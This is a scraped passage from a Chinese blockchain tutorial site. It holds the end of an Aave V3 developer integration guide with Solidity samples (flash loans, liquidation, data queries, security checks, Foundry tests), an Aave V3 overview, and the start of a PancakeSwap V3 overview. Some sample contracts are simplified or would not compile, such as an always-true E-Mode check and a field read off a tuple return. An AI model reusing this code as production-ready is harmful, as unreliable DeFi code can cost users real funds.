(bool) {\n        require(msg.sender == address(POOL), &quot;Invalid caller&quot;);\n        require(initiator == address(this), &quot;Invalid initiator&quot;);\n \n        // ============================================\n        // 在这里执行自定义逻辑\n        // 例如：套利、清算、再融资等\n        // ============================================\n \n        // 授权归还\n        uint256 amountOwed = amount + premium;\n        IERC20(asset).approve(address(POOL), amountOwed);\n \n        return true;\n    }\n \n    function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProvider) {\n        return ADDRESSES_PROVIDER;\n    }\n \n    function POOL() external view returns (IPool) {\n        return POOL;\n    }\n}\n3.2 清算集成\ncontract LiquidationHelper {\n    IPool public immutable pool;\n    IPoolDataProvider public immutable dataProvider;\n \n    /**\n     * @notice 检查用户是否可清算\n     */\n    function checkLiquidation(address user) external view returns (\n        bool canLiquidate,\n        uint256 healthFactor,\n        uint256 totalDebt\n    ) {\n        (\n            ,\n            uint256 _totalDebt,\n            ,\n            ,\n            ,\n            uint256 _healthFactor\n        ) = pool.getUserAccountData(user);\n \n        healthFactor = _healthFactor;\n        totalDebt = _totalDebt;\n        canLiquidate = _healthFactor &lt; 1e18;\n    }\n \n    /**\n     * @notice 获取用户债务详情\n     */\n    function getUserDebts(address user, address[] calldata reserves)\n        external view returns (\n            address[] memory debtAssets,\n            uint256[] memory stableDebts,\n            uint256[] memory variableDebts\n        )\n    {\n        uint256 length = reserves.length;\n        debtAssets = new address[](length);\n        stableDebts = new uint256[](length);\n        variableDebts = new uint256[](length);\n \n        for (uint256 i = 0; i &lt; length; i++) {\n            (\n                ,\n                uint256 stableDebt,\n                uint256 variableDebt,\n                ,\n                ,\n                ,\n                ,\n                ,\n \n            ) = dataProvider.getUserReserveData(reserves[i], user);\n \n            if (stableDebt &gt; 0 || variableDebt &gt; 0) {\n                debtAssets[i] = reserves[i];\n                stableDebts[i] = stableDebt;\n                variableDebts[i] = variableDebt;\n            }\n        }\n    }\n \n    /**\n     * @notice 执行清算\n     */\n    function liquidate(\n        address collateralAsset,\n        address debtAsset,\n        address user,\n        uint256 debtToCover,\n        bool receiveAToken\n    ) external {\n        IERC20(debtAsset).safeTransferFrom(msg.sender, address(this), debtToCover);\n        IERC20(debtAsset).safeApprove(address(pool), debtToCover);\n \n        pool.liquidationCall(\n            collateralAsset,\n            debtAsset,\n            user,\n            debtToCover,\n            receiveAToken\n        );\n \n        // 转移获得的抵押品给调用者\n        if (receiveAToken) {\n            address aToken = pool.getReserveData(collateralAsset).aTokenAddress;\n            uint256 aTokenBalance = IERC20(aToken).balanceOf(address(this));\n            IERC20(aToken).safeTransfer(msg.sender, aTokenBalance);\n        } else {\n            uint256 collateralBalance = IERC20(collateralAsset).balanceOf(address(this));\n            IERC20(collateralAsset).safeTransfer(msg.sender, collateralBalance);\n        }\n    }\n}\n3.3 E-Mode 集成\ncontract EModeHelper {\n    IPool public immutable pool;\n \n    /**\n     * @notice 设置用户 E-Mode\n     * @param categoryId 0=禁用, 1=稳定币, 2=ETH相关, 等\n     */\n    function setUserEMode(uint8 categoryId) external {\n        pool.setUserEMode(categoryId);\n    }\n \n    /**\n     * @notice 获取 E-Mode 类别信息\n     */\n    function getEModeCategory(uint8 categoryId) external view returns (\n        uint16 ltv,\n        uint16 liquidationThreshold,\n        uint16 liquidationBonus,\n        address priceSource,\n        string memory label\n    ) {\n        DataTypes.EModeCategory memory category = pool.getEModeCategoryData(categoryId);\n        return (\n            category.ltv,\n            category.liquidationThreshold,\n            category.liquidationBonus,\n            category.priceSource,\n            category.label\n        );\n    }\n \n    /**\n     * @notice 检查用户是否可以进入指定 E-Mode\n     */\n    function canEnterEMode(address user, uint8 categoryId) external view returns (bool) {\n        // 检查用户所有抵押品和债务是否都属于该类别\n        // 实际实现需要遍历用户资产\n        return true; // 简化示例\n    }\n}\n\n4. 数据查询\n4.1 用户数据查询\ncontract AaveDataReader {\n    IPool public immutable pool;\n    IPoolDataProvider public immutable dataProvider;\n    IPriceOracle public immutable oracle;\n \n    /**\n     * @notice 获取用户账户概览\n     */\n    function getUserAccountData(address user) external view returns (\n        uint256 totalCollateralBase,\n        uint256 totalDebtBase,\n        uint256 availableBorrowsBase,\n        uint256 currentLiquidationThreshold,\n        uint256 ltv,\n        uint256 healthFactor\n    ) {\n        return pool.getUserAccountData(user);\n    }\n \n    /**\n     * @notice 获取用户特定储备数据\n     */\n    function getUserReserveData(address asset, address user) external view returns (\n        uint256 currentATokenBalance,\n        uint256 currentStableDebt,\n        uint256 currentVariableDebt,\n        uint256 principalStableDebt,\n        uint256 scaledVariableDebt,\n        uint256 stableBorrowRate,\n        uint256 liquidityRate,\n        uint40 stableRateLastUpdated,\n        bool usageAsCollateralEnabled\n    ) {\n        return dataProvider.getUserReserveData(asset, user);\n    }\n \n    /**\n     * @notice 获取储备数据\n     */\n    function getReserveData(address asset) external view returns (\n        uint256 availableLiquidity,\n        uint256 totalStableDebt,\n        uint256 totalVariableDebt,\n        uint256 liquidityRate,\n        uint256 variableBorrowRate,\n        uint256 stableBorrowRate,\n        uint256 averageStableBorrowRate,\n        uint256 liquidityIndex,\n        uint256 variableBorrowIndex\n    ) {\n        return dataProvider.getReserveData(asset);\n    }\n \n    /**\n     * @notice 获取资产价格\n     */\n    function getAssetPrice(address asset) external view returns (uint256) {\n        return oracle.getAssetPrice(asset);\n    }\n \n    /**\n     * @notice 计算用户最大可借金额\n     */\n    function getMaxBorrow(address user, address asset) external view returns (uint256) {\n        (\n            ,\n            ,\n            uint256 availableBorrowsBase,\n            ,\n            ,\n \n        ) = pool.getUserAccountData(user);\n \n        uint256 assetPrice = oracle.getAssetPrice(asset);\n        uint8 decimals = dataProvider.getReserveConfigurationData(asset).decimals;\n \n        return (availableBorrowsBase * (10 ** decimals)) / assetPrice;\n    }\n}\n4.2 储备配置查询\ncontract ReserveConfigReader {\n    IPoolDataProvider public immutable dataProvider;\n \n    /**\n     * @notice 获取储备配置\n     */\n    function getReserveConfig(address asset) external view returns (\n        uint256 ltv,\n        uint256 liquidationThreshold,\n        uint256 liquidationBonus,\n        uint256 reserveFactor,\n        bool usageAsCollateralEnabled,\n        bool borrowingEnabled,\n        bool stableBorrowingEnabled,\n        bool isActive,\n        bool isFrozen\n    ) {\n        (\n            uint256 decimals,\n            uint256 _ltv,\n            uint256 _liquidationThreshold,\n            uint256 _liquidationBonus,\n            uint256 _reserveFactor,\n            bool _usageAsCollateral,\n            bool _borrowing,\n            bool _stableBorrowing,\n            bool _active,\n            bool _frozen\n        ) = dataProvider.getReserveConfigurationData(asset);\n \n        return (\n            _ltv,\n            _liquidationThreshold,\n            _liquidationBonus,\n            _reserveFactor,\n            _usageAsCollateral,\n            _borrowing,\n            _stableBorrowing,\n            _active,\n            _frozen\n        );\n    }\n \n    /**\n     * @notice 获取储备上限\n     */\n    function getReserveCaps(address asset) external view returns (\n        uint256 borrowCap,\n        uint256 supplyCap\n    ) {\n        return dataProvider.getReserveCaps(asset);\n    }\n \n    /**\n     * @notice 获取储备代币地址\n     */\n    function getReserveTokens(address asset) external view returns (\n        address aTokenAddress,\n        address stableDebtTokenAddress,\n        address variableDebtTokenAddress\n    ) {\n        return dataProvider.getReserveTokensAddresses(asset);\n    }\n}\n\n5. 安全最佳实践\n5.1 输入验证\ncontract SafeAaveIntegration {\n    using SafeERC20 for IERC20;\n \n    IPool public immutable pool;\n \n    // 最小健康因子阈值\n    uint256 public constant MIN_HEALTH_FACTOR = 1.05e18; // 1.05\n \n    modifier validAmount(uint256 amount) {\n        require(amount &gt; 0, &quot;Invalid amount&quot;);\n        _;\n    }\n \n    modifier validAddress(address addr) {\n        require(addr != address(0), &quot;Invalid address&quot;);\n        _;\n    }\n \n    modifier healthFactorAboveMin(address user) {\n        (\n            ,\n            ,\n            ,\n            ,\n            ,\n            uint256 healthFactor\n        ) = pool.getUserAccountData(user);\n \n        require(\n            healthFactor &gt;= MIN_HEALTH_FACTOR || healthFactor == type(uint256).max,\n            &quot;Health factor too low&quot;\n        );\n        _;\n    }\n \n    function safeBorrow(\n        address asset,\n        uint256 amount\n    ) external validAddress(asset) validAmount(amount) healthFactorAboveMin(msg.sender) {\n        pool.borrow(asset, amount, 2, 0, msg.sender);\n    }\n}\n5.2 重入保护\nimport {ReentrancyGuard} from &quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;;\n \ncontract ReentrancyProtectedAave is ReentrancyGuard {\n    IPool public immutable pool;\n \n    function supplyAndBorrow(\n        address supplyAsset,\n        uint256 supplyAmount,\n        address borrowAsset,\n        uint256 borrowAmount\n    ) external nonReentrant {\n        // 存款\n        IERC20(supplyAsset).safeTransferFrom(msg.sender, address(this), supplyAmount);\n        IERC20(supplyAsset).safeApprove(address(pool), supplyAmount);\n        pool.supply(supplyAsset, supplyAmount, msg.sender, 0);\n \n        // 借贷\n        pool.borrow(borrowAsset, borrowAmount, 2, 0, msg.sender);\n    }\n}\n5.3 价格检查\ncontract PriceProtectedAave {\n    IPool public immutable pool;\n    IPriceOracle public immutable oracle;\n \n    // 最大价格偏差 (5%)\n    uint256 public constant MAX_PRICE_DEVIATION = 500;\n \n    mapping(address =&gt; uint256) public lastKnownPrices;\n \n    /**\n     * @notice 检查价格是否在合理范围内\n     */\n    function isPriceValid(address asset) public view returns (bool) {\n        uint256 currentPrice = oracle.getAssetPrice(asset);\n        uint256 lastPrice = lastKnownPrices[asset];\n \n        if (lastPrice == 0) return true;\n \n        uint256 deviation = currentPrice &gt; lastPrice\n            ? ((currentPrice - lastPrice) * 10000) / lastPrice\n            : ((lastPrice - currentPrice) * 10000) / lastPrice;\n \n        return deviation &lt;= MAX_PRICE_DEVIATION;\n    }\n \n    function safeSupply(address asset, uint256 amount) external {\n        require(isPriceValid(asset), &quot;Price deviation too high&quot;);\n \n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n        IERC20(asset).safeApprove(address(pool), amount);\n        pool.supply(asset, amount, msg.sender, 0);\n \n        // 更新已知价格\n        lastKnownPrices[asset] = oracle.getAssetPrice(asset);\n    }\n}\n\n6. Gas 优化\n6.1 批量操作\ncontract BatchAaveOperations {\n    IPool public immutable pool;\n \n    struct SupplyParams {\n        address asset;\n        uint256 amount;\n    }\n \n    struct BorrowParams {\n        address asset;\n        uint256 amount;\n        uint256 interestRateMode;\n    }\n \n    /**\n     * @notice 批量存款\n     */\n    function batchSupply(SupplyParams[] calldata params) external {\n        for (uint256 i = 0; i &lt; params.length; i++) {\n            IERC20(params[i].asset).safeTransferFrom(\n                msg.sender,\n                address(this),\n                params[i].amount\n            );\n            IERC20(params[i].asset).safeApprove(address(pool), params[i].amount);\n            pool.supply(params[i].asset, params[i].amount, msg.sender, 0);\n        }\n    }\n \n    /**\n     * @notice 批量借贷\n     */\n    function batchBorrow(BorrowParams[] calldata params) external {\n        for (uint256 i = 0; i &lt; params.length; i++) {\n            pool.borrow(\n                params[i].asset,\n                params[i].amount,\n                params[i].interestRateMode,\n                0,\n                msg.sender\n            );\n        }\n    }\n}\n6.2 使用 Permit\ncontract PermitAaveIntegration {\n    IPool public immutable pool;\n \n    /**\n     * @notice 使用 Permit 授权后存款（节省一次交易）\n     */\n    function supplyWithPermit(\n        address asset,\n        uint256 amount,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        // EIP-2612 Permit\n        IERC20Permit(asset).permit(\n            msg.sender,\n            address(this),\n            amount,\n            deadline,\n            v,\n            r,\n            s\n        );\n \n        IERC20(asset).safeTransferFrom(msg.sender, address(this), amount);\n        IERC20(asset).safeApprove(address(pool), amount);\n        pool.supply(asset, amount, msg.sender, 0);\n    }\n}\n\n7. 测试\n7.1 Foundry 测试示例\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.10;\n \nimport &quot;forge-std/Test.sol&quot;;\nimport {IPool} from &quot;@aave/core-v3/contracts/interfaces/IPool.sol&quot;;\n \ncontract AaveIntegrationTest is Test {\n    IPool pool;\n    address constant POOL_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;\n    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;\n \n    address user = address(0x1234);\n \n    function setUp() public {\n        // Fork 主网\n        vm.createSelectFork(vm.envString(&quot;ETH_RPC_URL&quot;));\n        pool = IPool(POOL_ADDRESS);\n \n        // 给用户一些 USDC\n        deal(USDC, user, 100000e6);\n    }\n \n    function testSupply() public {\n        vm.startPrank(user);\n \n        // 授权\n        IERC20(USDC).approve(address(pool), 1000e6);\n \n        // 存款\n        pool.supply(USDC, 1000e6, user, 0);\n \n        // 验证\n        (uint256 totalCollateral, , , , , ) = pool.getUserAccountData(user);\n        assertGt(totalCollateral, 0);\n \n        vm.stopPrank();\n    }\n \n    function testBorrow() public {\n        // 先存款\n        testSupply();\n \n        vm.startPrank(user);\n \n        // 借贷\n        pool.borrow(USDC, 500e6, 2, 0, user);\n \n        // 验证\n        (, uint256 totalDebt, , , , ) = pool.getUserAccountData(user);\n        assertGt(totalDebt, 0);\n \n        vm.stopPrank();\n    }\n \n    function testHealthFactor() public {\n        testBorrow();\n \n        (, , , , , uint256 healthFactor) = pool.getUserAccountData(user);\n \n        // 健康因子应该大于 1\n        assertGt(healthFactor, 1e18);\n    }\n}\n\n8. 常见错误处理\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n错误码含义解决方案1Invalid amount检查金额 &gt; 027Reserve frozen储备已冻结，无法操作28Reserve paused储备已暂停35Health factor lower than threshold增加抵押品或减少借贷36Collateral cannot cover new borrow抵押品不足38Borrow cap exceeded借贷上限已满39Supply cap exceeded存款上限已满\n\n9. 小结\n集成检查清单：\n\n 正确导入接口和库\n 使用 SafeERC20 进行代币操作\n 添加输入验证和权限检查\n 实现重入保护\n 添加健康因子检查\n 编写全面的测试\n 在测试网验证后再部署主网\n\n推荐开发流程：\n\n在 Foundry 中 fork 主网进行本地测试\n部署到测试网（Sepolia/Goerli）验证\n审计合约代码\n部署到主网\n\n祝您开发顺利！"},"blockchainguide/DApp_Development/应用场景/defi/aave/README":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/README","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/README.md","title":"README","links":[],"tags":[],"content":"Aave V3 深度解析\n\n去中心化借贷协议的技术巅峰 - 从原理到实践的完整指南\n\n概述\nAave V3 是目前 DeFi 领域最先进的去中心化借贷协议，部署在以太坊、Polygon、Arbitrum、Optimism 等多个区块链网络上。本系列文档将从架构设计、核心机制、数学原理到开发实践，全方位剖析 Aave V3。\n核心特性\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n特性描述创新点Portal 跨链跨链流动性桥接统一多链流动性E-Mode效率模式相关资产高达 97% LTVIsolation Mode隔离模式新资产安全上线Gas 优化L2 专属优化calldata 压缩降本 50%+动态清算自适应清算因子健康因子驱动清算比例\n文档大纲\naave/\n├── README.md                          # 本文件 - 总览与导航\n├── 01-核心概念与架构.md                # 整体架构与设计模式\n├── 02-借贷机制详解.md                  # 存款、借贷、还款、清算\n├── 03-利率模型与数学原理.md            # 双斜率模型、复利计算、健康因子\n├── 04-代币化机制.md                    # aToken、债务代币、缩放余额\n├── 05-高级功能.md                      # E-Mode、隔离模式、Portal、闪电贷\n├── 06-套利与MEV策略.md                 # 清算套利、利率套利、跨协议套利\n├── 07-开发者集成指南.md                # 合约集成、监控工具、最佳实践\n└── Avae原理.md                         # 原始深度分析文档\n\n学习路径\n入门级 (Beginner)\n\nREADME.md - 了解 Aave V3 整体概念\n01-核心概念与架构.md - 理解系统架构\n02-借贷机制详解.md - 掌握基础借贷流程\n\n进阶级 (Intermediate)\n\n03-利率模型与数学原理.md - 深入利率计算\n04-代币化机制.md - 理解 aToken 和债务代币\n05-高级功能.md - 掌握 E-Mode、隔离模式\n\n专家级 (Expert)\n\n06-套利与MEV策略.md - 套利机会与风险\n07-开发者集成指南.md - 实战开发集成\n\n架构速览\n┌─────────────────────────────────────────────────────────────┐\n│                        用户交互层                            │\n│  Supply | Borrow | Repay | Withdraw | Liquidate | FlashLoan │\n└─────────────────────────────────────────────────────────────┘\n                              │\n                              ▼\n┌─────────────────────────────────────────────────────────────┐\n│                      Pool (核心入口)                         │\n│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐       │\n│  │PoolConfigurator│  │PoolAddresses │  │  ACLManager  │       │\n│  │   (配置管理)   │  │Provider(地址)│  │  (权限控制)  │       │\n│  └──────────────┘  └──────────────┘  └──────────────┘       │\n└─────────────────────────────────────────────────────────────┘\n                              │\n                              ▼\n┌─────────────────────────────────────────────────────────────┐\n│                      逻辑库层 (Libraries)                    │\n│  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐           │\n│  │SupplyLogic│ │BorrowLogic│ │LiquidationLogic│ │FlashLoanLogic│  │\n│  └─────────┘ └─────────┘ └─────────┘ └─────────┘           │\n│  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐           │\n│  │EModeLogic │ │BridgeLogic│ │ValidationLogic│ │GenericLogic│      │\n│  └─────────┘ └─────────┘ └─────────┘ └─────────┘           │\n└─────────────────────────────────────────────────────────────┘\n                              │\n                              ▼\n┌─────────────────────────────────────────────────────────────┐\n│                      代币化层 (Tokenization)                 │\n│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐       │\n│  │    AToken    │  │StableDebtToken│  │VariableDebtToken│    │\n│  │  (存款凭证)  │  │ (固定利率债务) │  │ (浮动利率债务)  │    │\n│  └──────────────┘  └──────────────┘  └──────────────┘       │\n└─────────────────────────────────────────────────────────────┘\n                              │\n                              ▼\n┌─────────────────────────────────────────────────────────────┐\n│                      基础设施层                              │\n│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐       │\n│  │ PriceOracle  │  │InterestRate  │  │  DataTypes   │       │\n│  │   (预言机)   │  │  Strategy    │  │  (数据结构)  │       │\n│  └──────────────┘  └──────────────┘  └──────────────┘       │\n└─────────────────────────────────────────────────────────────┘\n\n核心公式速查\n健康因子 (Health Factor)\nHF = (Σ Collateral_i × LiquidationThreshold_i) / TotalDebt\n\nHF &gt; 1  → 安全\nHF ≤ 1  → 可被清算\n\n利用率 (Utilization Rate)\nU = TotalBorrowed / (TotalBorrowed + AvailableLiquidity)\n\n双斜率利率模型\n当 U ≤ U_optimal:\n  BorrowRate = BaseRate + (U / U_optimal) × Slope1\n\n当 U &gt; U_optimal:\n  BorrowRate = BaseRate + Slope1 + ((U - U_optimal) / (1 - U_optimal)) × Slope2\n\n存款利率\nSupplyRate = BorrowRate × U × (1 - ReserveFactor)\n\n合约地址 (以太坊主网)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n合约地址Pool0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2PoolAddressesProvider0x2f39d218133AFaB8F2B819B1066c7E434Ad94E9ePoolDataProvider0x7B4EB56E7CD4b454BA8ff71E4518426369a138a3Oracle0x54586bE62E3c3580375aE3723C145253060Ca0C2\n相关资源\n\nAave V3 官方文档\nAave V3 GitHub\nAave V3 技术白皮书\nAave 治理论坛\n\n风险提示\n⚠️ 重要声明：\n\n本文档仅供学习和研究目的\nDeFi 协议存在智能合约风险、清算风险、预言机风险等\n套利策略需要专业知识和风险管理能力\n在进行任何操作前，请充分了解相关风险\n\n\n最后更新: 2025-01"},"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/01-PancakeSwap-V3概述":{"slug":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/01-PancakeSwap-V3概述","filePath":"blockchainguide/DApp_Development/应用场景/defi/pancake/v3/01-PancakeSwap-V3概述.md","title":"01-PancakeSwap-V3概述","links":[],"tags":[],"content":"死磕PancakeSwap V3（一）：PancakeSwap V3概述\n\n本文是「死磕PancakeSwap V3」系列的第一篇，介绍PancakeSwap的发展历程、V3的核心创新以及与Uniswap V3的差异。\n\n系列导航\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n序号标题核心内容01PancakeSwap V3概述发展历程、集中流动性、V3特色02Tick机制与价格数学Tick设计、价格转换算法03架构与合约设计Factory、Pool合约结构04交换机制深度解析swap函数、价格发现05流动性管理与头寸Position、mint/burn06费用系统与预言机费用分配、TWAP07V3与Uniswap V3对比差异点、优化、适用场景08多链部署与特性适配BNB Chain、Ethereum、跨链策略09集成开发指南SDK使用、交易构建、最佳实践10MEV与套利策略JIT、三明治攻击、防范策略\n\n1. PancakeSwap的发展历程\n1.1 从V1到V3的演进\nPancakeSwap的发展历程代表了BNB Chain生态中DEX技术的快速演进：\nflowchart LR\n    subgraph V1[&quot;PancakeSwap V1&quot;]\n        A1[基于BSC]\n        A2[ETH-BNB配对]\n        A3[低gas费优势]\n        A4[高APY农场]\n    end\n\n    subgraph V2[&quot;PancakeSwap V2&quot;]\n        B1[任意代币配对]\n        B2[闪电贷功能]\n        B3[价格预言机]\n        B4[糖浆池Syrup Pools]\n    end\n\n    subgraph V3[&quot;PancakeSwap V3&quot;]\n        C1[集中流动性]\n        C2[多级费率]\n        C3[NFT LP Token]\n        C4[多链部署]\n        C5[更灵活治理]\n    end\n\n    V1 --&gt;|2020年9月| V2\n    V2 --&gt;|2023年4月| V3\n\n    style V3 fill:#ffeb3b\n\n1.2 PancakeSwap V3发布背景\nPancakeSwap V3于2023年4月在BNB Chain上发布，具有以下重要意义：\ngraph TB\n    subgraph MarketDemand[&quot;市场需求&quot;]\n        M1[提升资本效率]\n        M2[降低交易成本]\n        M3[增强用户体验]\n    end\n\n    subgraph CompetitivePressure[&quot;竞争压力&quot;]\n        C1[Uniswap V3成功]\n        C2[多链DEX崛起]\n        C3[需要保持领先]\n    end\n\n    subgraph TechnologyInnovation[&quot;技术创新&quot;]\n        T1[集中流动性引入]\n        T2[优化gas效率]\n        T3[完善生态整合]\n    end\n\n    subgraph V3Launch[&quot;PancakeSwap V3发布&quot;]\n        L1[2023年4月BNB Chain]\n        L2[2023年6月Ethereum]\n        L3[2023年多链扩展]\n    end\n\n    MarketDemand --&gt; V3Launch\n    CompetitivePressure --&gt; V3Launch\n    TechnologyInnovation --&gt; V3Launch\n\n    style V3Launch fill:#c8e6c9\n\n1.3 关键时间节点\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n时间事件意义2020.09PancakeSwap V1上线BSC首个AMM DEX2021.03PancakeSwap V2发布引入任意代币对2023.04V3在BNB Chain上线集中流动性革命2023.06V3扩展到Ethereum多链战略开始2023.09V3扩展到Aptos非EVM链探索2024.01V3优化升级Gas效率提升\n\n2. 集中流动性：V3的核心创新\n2.1 传统AMM的局限性\n在理解集中流动性之前，先回顾传统AMM（V1/V2）的问题：\ngraph TD\n    subgraph TraditionalAMMProblems[&quot;传统AMM问题&quot;]\n        P1[流动性均匀分布在&lt;br/&gt;0到∞的价格范围]\n        P2[大部分流动性&lt;br/&gt;永远不会被使用]\n        P3[资本利用率&lt;br/&gt;仅1-5%]\n        P4[LP无法控制&lt;br/&gt;价格暴露区间]\n    end\n\n    P1 --&gt; R1[资本效率极低]\n    P2 --&gt; R1\n    P3 --&gt; R2[收益率受限]\n    P4 --&gt; R3[被动承担风险]\n\n    style R1 fill:#ffcdd2\n    style R2 fill:#ffcdd2\n    style R3 fill:#ffcdd2\n\n资本利用率问题示例：\n假设CAKE/BNB交易对，当前价格为20 BNB/CAKE：\n\n在传统AMM中，流动性分布在价格区间 [0, ∞]\n但90%的交易发生在 [18, 22] 价格区间\n这意味着大约10%的流动性在处理90%的交易量\n\n2.2 集中流动性原理\n集中流动性允许流动性提供者（LP）将资金集中在自定义的价格区间内：\ngraph TB\n    subgraph TraditionalAMM[&quot;传统AMM流动性分布&quot;]\n        T1[&quot;价格区间: [0, ∞]&quot;]\n        T2[&quot;流动性均匀分布&quot;]\n        T3[&quot;大部分资金闲置&quot;]\n    end\n\n    subgraph PancakeSwapV3[&quot;PancakeSwap V3 集中流动性&quot;]\n        V1[&quot;自定义价格区间&lt;br/&gt;[Pa, Pb]&quot;]\n        V2[&quot;流动性高度集中&quot;]\n        V3[&quot;资本效率提升&lt;br/&gt;最高4000倍&quot;]\n    end\n\n    TraditionalAMM --&gt;|革新| PancakeSwapV3\n\n    style PancakeSwapV3 fill:#ffeb3b\n\n2.3 集中流动性的数学基础\n集中流动性公式（在价格区间 [Pa, Pb] 内）：\n(x + L/√Pb) × (y + L×√Pa) = L²\n\n其中：\n\nL: 流动性常数（Liquidity）\nPa: 价格区间下界\nPb: 价格区间上界\nx, y: 代币的虚拟储备量\n\n2.4 三种价格位置的资产状态\nstateDiagram-v2\n    [*] --&gt; BelowRange: P &lt; Pa\n    [*] --&gt; InRange: Pa ≤ P ≤ Pb\n    [*] --&gt; AboveRange: P &gt; Pb\n\n    BelowRange --&gt; OnlyToken0: 100% token0\n    InRange --&gt; MixedHolding: token0 + token1\n    AboveRange --&gt; OnlyToken1: 100% token1\n\n    state BelowRange as &quot;价格在区间下方&quot;\n    state InRange as &quot;价格在区间内&quot;\n    state AboveRange as &quot;价格在区间上方&quot;\n    state OnlyToken0 as &quot;只持有Token0&quot;\n    state MixedHolding as &quot;混合持有&quot;\n    state OnlyToken1 as &quot;只持有Token1&quot;\n\n    note right of InRange\n        流动性活跃\n        可赚取交易费用\n    end note\n\n    note right of BelowRange\n        流动性未激活\n        等待价格上涨\n    end note\n\n    note right of AboveRange\n        流动性未激活\n        等待价格下跌\n    end note\n\n\n3. PancakeSwap V3的特色优势\n3.1 多链部署战略\ngraph LR\n    subgraph Chains[&quot;已部署链&quot;]\n        C1[BNB Chain&lt;br/&gt;主阵地]\n        C2[Ethereum&lt;br/&gt;主要扩展]\n        C3[Aptos&lt;br/&gt;非EVM探索]\n        C4[更多链&lt;br/&gt;持续扩展中]\n    end\n\n    subgraph Benefits[&quot;多链优势&quot;]\n        B1[用户多样性]\n        B2[流动性分散]\n        B3[降低单点风险]\n        B4[生态互补]\n    end\n\n    Chains --&gt; Benefits\n\n    style C1 fill:#ffeb3b\n    style C2 fill:#e3f2fd\n\n3.2 更灵活的费率结构\nPancakeSwap V3在Uniswap V3基础上提供了更丰富的费率选择：\ngraph LR\n    subgraph FeeTiers[&quot;费用等级&quot;]\n        F1[&quot;0.01%&lt;br/&gt;稳定币对&quot;]\n        F2[&quot;0.05%&lt;br/&gt;相关资产&quot;]\n        F3[&quot;0.25%&lt;br/&gt;主流币对&quot;]\n        F4[&quot;1.00%&lt;br/&gt;高风险币对&quot;]\n    end\n\n    subgraph PancakeFeatures[&quot;Pancake特色&quot;]\n        P1[更多费率选择]\n        P2[自定义费率池]\n        P3[灵活治理调整]\n        P4[社区投票机制]\n    end\n\n    FeeTiers --&gt; PancakeFeatures\n\n    style PancakeFeatures fill:#ffeb3b\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n费率PancakeSwapUniswap差异0.01%✅✅相同0.05%✅✅相同0.25%✅-Pancake独有0.30%✅✅Pancake 0.25%1.00%✅✅相同\n3.3 与PancakeSwap生态的深度集成\nmindmap\n  root((PancakeSwap V3&lt;br/&gt;生态集成))\n    Farm(流动性农场)\n      V3农场池\n      自动复投\n      CAKE激励\n    IFO(初始农场发行)\n      V3池参与\n      新币分配\n      社区参与\n    Syrup(糖浆池)\n      CAKE质押\n      收益分配\n      治理权益\n    Lottery(彩票)\n      CAKE代币\n      资金池\n      公平抽奖\n    NFT(收藏品)\n    团队(团队头像)\n    特权(特权卡)\n    营销(营销工具)\n\n3.4 CAKE治理代币\nflowchart TB\n    subgraph CAKE[&quot;CAKE代币效用&quot;]\n        C1[投票权&lt;br/&gt;协议治理]\n        C2[收益分配&lt;br/&gt;农场激励]\n        C3[生态支付&lt;br/&gt;手续费]\n        C4[流动性激励&lt;br/&gt;V3池奖励]\n    end\n\n    subgraph Governance[&quot;治理机制&quot;]\n        G1[DAO提案]\n        G2[社区投票]\n        G3[参数调整]\n        G4[资金分配]\n    end\n\n    CAKE --&gt; Governance\n\n    style CAKE fill:#ffeb3b\n    style Governance fill:#c8e6c9\n\n\n4. PancakeSwap V3 vs Uniswap V3\n4.1 核心差异对比\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n方面PancakeSwap V3Uniswap V3部署链BNB Chain、Ethereum、Aptos等Ethereum、Arbitrum、Optimism等费率层级0.01%、0.05%、0.25%、1.00%0.01%、0.05%、0.30%、1.00%治理代币CAKEUNI费用分配灵活的协议费率固定协议费率Gas成本BNB Chain上极低Ethereum上较高生态整合农场、IFO、Lottery等深度整合相对独立社区驱动强调社区参与团队主导\n4.2 选择指南\nflowchart TD\n    A[&quot;选择DEX&quot;] --&gt; B{目标链?}\n\n    B --&gt;|BNB Chain| C[&quot;PancakeSwap V3&quot;]\n    B --&gt;|Ethereum| D{优先考虑?}\n\n    D --&gt;|Gas成本| E[&quot;PancakeSwap V3&lt;br/&gt;(如果V3已部署)&quot;]\n    D --&gt;|流动性深度| F[&quot;Uniswap V3&quot;]\n    D --&gt;|生态整合| G[&quot;PancakeSwap V3&quot;]\n    D --&gt;|标准化| H[&quot;Uniswap 